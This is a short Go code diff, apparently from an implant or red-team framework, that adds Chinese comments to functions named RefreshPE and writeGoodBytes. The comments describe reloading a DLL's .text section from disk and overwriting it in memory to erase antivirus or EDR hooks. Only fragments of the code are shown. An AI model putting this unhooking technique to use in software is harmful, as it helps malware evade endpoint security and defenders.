@@ -31,6 +31,7 @@ import (
 
 // RefreshPE reloads a DLL from disk into the current process
 // in an attempt to erase AV or EDR hooks placed at runtime.
+// 重新加载DLL，只覆盖当前的text段
 func RefreshPE(name string) error {
 	//{{if .Config.Debug}}
 	log.Printf("Reloading %s...\n", name)
@@ -49,6 +50,7 @@ func RefreshPE(name string) error {
 	return writeGoodBytes(ddf, name, x.VirtualAddress, x.Name, x.VirtualSize)
 }
 
+// 将字节覆盖到当前内存的相应位置
 func writeGoodBytes(b []byte, pn string, virtualoffset uint32, secname string, vsize uint32) error {
 	t, e := windows.LoadDLL(pn)
 	if e != nil {
